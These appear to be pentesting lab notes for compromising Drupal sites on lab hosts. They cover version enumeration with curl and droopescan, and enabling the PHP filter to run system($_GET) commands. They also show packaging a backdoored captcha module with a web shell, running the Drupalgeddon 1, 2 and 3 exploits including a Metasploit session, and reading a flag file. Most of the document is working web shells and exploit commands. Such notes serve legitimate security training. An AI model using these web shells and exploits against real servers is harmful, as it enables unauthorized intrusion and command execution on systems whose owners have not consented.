[multiple versions](https://www.drupal.org/sa-core-2018-004)[multiple versions](https://www.drupal.org/sa-core-2018-004)### Discovery
```bash
curl -s http://drupal.inlanefreight.local | grep Drupal

Or through Nodes
http://drupal.inlanefreight.local/node/1
```
1. `Administrator`: This user has complete control over the Drupal website.
2. `Authenticated User`: These users can log in to the website and perform operations such as adding and editing articles based on their permissions.
3. `Anonymous`: All website visitors are designated as anonymous. By default, these users are only allowed to read posts.

### Enumeration
```bash
curl -s http://drupal.inlanefreight.local/CHANGELOG.txt
curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""

Or using Droopscan found in the Joomla section

droopescan scan drupal -u http://drupal.inlanefreight.local
```

# Attacking Drupal less than v8
In older versions of Drupal (before version 8), it was possible to log in as an admin and enable the `PHP filter` module, which "Allows embedded PHP code/snippets to be evaluated."
Then `save configuration`, the going to `Content->Adding content` to create a basic page. `system($_GET['cmd']);`
MAKE SURE TEXT FORMAT IS `PHP`.
Once everything is saved you can go to the node number then adding `?cmd=id`.
```bash
curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"
```

# Attacking Drupal v8 or more.
```bash
wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz

Once downloaded go to Administration > Reports > Available updates.
http://drupal.inlanefreight.local/admin/reports/updates/install

Then click browse then select the file from the dir thet we downloaded it to then click install.

Then going to content is is about the same as the v7 and down.
```

### Uploading a backdoored Module
```bash
wget --no-check-certificate https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz

# Create a php file with
<?php
system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']);
?>

# Then create a .htaccess file.
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>

mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
```

Assuming we have administrative access to the website, click on `Manage` and then `Extend` on the sidebar. Next, click on the `+ Install new module` button, and we will be taken to the install page, such as `http://drupal.inlanefreight.local/admin/modules/install` Browse to the backdoored Captcha archive and click `Install`.
Once the installation succeeds, browse to `/modules/captcha/shell.php` to execute commands.
`curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id`

# CVE
```bash
CVE-2014-3704, known as Drupalgeddon, affects versions 7.0 up to 7.31 and was fixed in version 7.32. This was a pre-authenticated SQL injection flaw that could be used to upload a malicious form or create a new admin user.

CVE-2018-7600, also known as Drupalgeddon2, is a remote code execution vulnerability, which affects versions of Drupal prior to 7.58 and 8.5.1. The vulnerability occurs due to insufficient input sanitization during user registration, allowing system-level commands to be maliciously injected.

CVE-2018-7602, also known as Drupalgeddon3, is a remote code execution vulnerability that affects multiple versions of Drupal 7.x and 8.x. This flaw exploits improper validation in the Form API.
Let's walk through exp
```

#### Drupalgeddon
[PoC](https://www.exploit-db.com/exploits/34992)
`python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd`
Then getting a shell like the other ways now that we are administrator.

#### Drupalgeddon v2
[PoC v2](https://www.exploit-db.com/exploits/44448)
```bash
python3 drupalgeddon2.py
Enter the url: url/shell.txt

curl -s http://drupal-dev.inlanefreight.local/shell.txt
```
```php
# Modifying the PHP
<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>

echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64

echo "Then base64 output" | base64 -d | tee mrb3n.php

python3 drupalgeddon2.py
Enter the url: http://drupal-dev.inlanefreight.local/
Check: http://drupal-dev.inlanefreight.local/mrb3n.php

curl http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id
```

#### Drupalgeddon v3
[Drupalgeddon3](https://github.com/rithchard/Drupalgeddon3)
[Multiple Versions](https://www.drupal.org/sa-core-2018-004)
![[Drupalgeddon-v3.png]]

```bash
msf6 exploit(multi/http/drupal_drupageddon3) > set rhosts 10.129.42.195
msf6 exploit(multi/http/drupal_drupageddon3) > set VHOST drupal-acc.inlanefreight.local   

msf6 exploit(multi/http/drupal_drupageddon3) > set drupal_session SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y

msf6 exploit(multi/http/drupal_drupageddon3) > set DRUPAL_NODE 1
msf6 exploit(multi/http/drupal_drupageddon3) > set LHOST 10.10.14.15
msf6 exploit(multi/http/drupal_drupageddon3) > show options 

exploit
sysinfo
```


# Exercise
```php
`<?php`

`echo "<pre>";`

`echo shell_exec($_GET['cmd']);`

`echo "</pre>";`

`?>`
```
```bash
curl -s "http://drupal-qa.inlanefreight.local/node/3?cmd=cat%20/var/www/drupal.inlanefreight.local/flag_6470e394cbf6dab6a91682cc8585059b.txt" | grep -A2 "<pre>"
```
